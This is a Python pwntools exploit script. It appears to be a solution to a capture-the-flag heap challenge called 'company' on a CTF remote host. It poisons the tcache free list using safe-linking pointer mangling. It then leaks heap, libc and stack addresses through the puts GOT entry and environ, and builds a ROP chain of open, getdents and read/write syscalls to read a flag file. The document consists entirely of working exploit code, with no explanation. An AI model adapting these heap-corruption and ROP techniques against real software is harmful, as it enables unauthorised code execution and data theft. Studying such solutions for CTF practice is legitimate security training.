from pwn import *

# Set up pwntools for the correct architecture
exe = "./company"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

# r = start()
r = remote("company.chal.crewc.tf", 17001)

def reg_emp(ind, name, pos, sal):
    sl(b"1")
    sla(b"Index: ", str(ind).encode())
    sla(b"Name: ", name)
    sla(b"Position: ", pos)
    sla(b"Salary: ", str(int(sal)).encode())

def fire_emp(ind):
    sl(b"2")
    sla(b"Index: ", str(ind).encode())

def give_feed(ind1, ind2, feed):
    sl(b"3")
    sla(b"Which Employee you are? ", str(ind1).encode())
    sla(b"Which Employee you want to give feedback? ", str(ind2).encode())
    sla(b"Feedback: ", feed)

def view_feed(ind):
    sl(b"4")
    sla(b"Which Employee's feedback you wanna see? ", str(ind).encode())
    ru(b"Feedback: ")
    return(rl())

def mangle(addr, val):
    return ((addr>>12) ^ (val))

sla("name? ", p64(0) + p64(0x61))
reg_emp(1, b"joji0", b"HR\x00" , 0x61)
reg_emp(2, b"joji1", b"HR\x00" , 0x61)
reg_emp(4, b".\x00", b"HR\x00" , 0x61)

# set the bss address in place of feedback.
give_feed(1, 2, b"A"*64 + p64(0x404060 + 16))
fire_emp(2)

# point the chunk to .bss address
reg_emp(3, b"joji3", b"HR" , 0x61)
fire_emp(3)

# make ourself from staff to HR
give_feed(1, 1, b"A"*(24-8) + b"HR"+ b"\x00"*6 + b"\x00"*(8*2)+ p64(0x61) + b"P"*7)

#get allcoation on list_of_chunk
give_feed(1, 1, b"A"*64 + p64(0x404060 + 64 + 32))
fire_emp(1)

reg_emp(3, b"joji3", b"HR\x00" , 0x61)
heap = u64(view_feed(3).strip().ljust(8, b"\x00")) - 7824

log.info(f"heap: {hex(heap)}")

#1120 - libseccomp address
give_feed(3, 3, b"A"*64 + p64(elf.got.puts))
fire_emp(3)

reg_emp(3, b"joji3", b"HR\x00" , 0x61)
libc.address = u64(view_feed(3).strip().ljust(8, b"\x00")) - libc.sym.puts

poprdi = 0x00000000000240e5 + libc.address
poprsi = 0x000000000002573e + libc.address
poprdx = 0x0000000000026302 + libc.address
poprax = 0x0000000000040143 + libc.address
syscall = libc.sym.syscall + 27
pushrax = 0x000000000003b535 + libc.address
poprsp = 0x000000000002f0a1 + libc.address

log.info(f"libc: {hex(libc.address)}")

give_feed(3, 3, b"A"*64 + p64(libc.sym.environ))
fire_emp(3)

reg_emp(3, b"joji3", b"HR\x00" , 0x61)
stack = u64(view_feed(3).strip().ljust(8, b"\x00"))

log.info(f"stack: {hex(stack)}")

# time to bomblast this shit
reg_emp(6, b"6666", b"HR\x00" , 0x61)
give_feed(3, 3, b"A"*64 + p64(heap + 7712))
fire_emp(3)

reg_emp(3, b"joji3", b"HR\x00" , 0x61)
fire_emp(3)

give_feed(4, 4, p64(0) + p64(0x61) + p64(mangle(heap+7728, stack-352-8)))

# payload = p64(pushrax) + p64(poprdi) + p64(poprsi) + p64(0x4040d8 + 20) + p64(poprdx) + p64(1000) + p64(poprax) + p64(78) + p64(syscall) 
give_feed(4, 4, b"./flag_you_found_this_my_treasure_leaked.txt\x00")

# Creating the ROP chain LIKE kill me FR

pause()
payload = p64(poprsi) + p64(0x4040d8) + p64(poprdx) + p64(0x300) + p64(libc.sym.read) + p64(poprsp) + p64(0x4040d8)
give_feed(4, 4, b"A"*8 + payload)

# payload = p64(poprdi) + p64(heap + 7824) + p64(poprsi) + p64(65536) + p64(poprax) + p64(2) + p64(syscall)
# payload += p64(poprdi) + p64(3) + p64(poprsi) + p64(0x4040d8 + 0x250) + p64(poprdx) + p64(0x200) + p64(poprax) + p64(78) + p64(syscall)
# payload += p64(poprdi) + p64(1) + p64(poprsi) + p64(0x4040d8 + 0x250) + p64(poprdx) + p64(0x100) + p64(libc.sym.write)
# sl(payload)
#flag_you_found_this_my_treasure_leaked.txt

flag = heap + 7728

payload = p64(poprdi) + p64(flag) + p64(poprsi) + p64(0) + p64(poprdx) + p64(0x100) + p64(poprax) + p64(2) + p64(syscall)
payload += p64(poprdi) + p64(3) + p64(poprsi) + p64(flag + 100) + p64(poprdx) + p64(0x100) + p64(libc.sym.read)
payload += p64(poprax) + p64(1) + p64(poprdi) + p64(1) + p64(poprsi) +  p64(flag + 100) + p64(poprdx) + p64(0x100) + p64(syscall)
sl(payload)

r.interactive()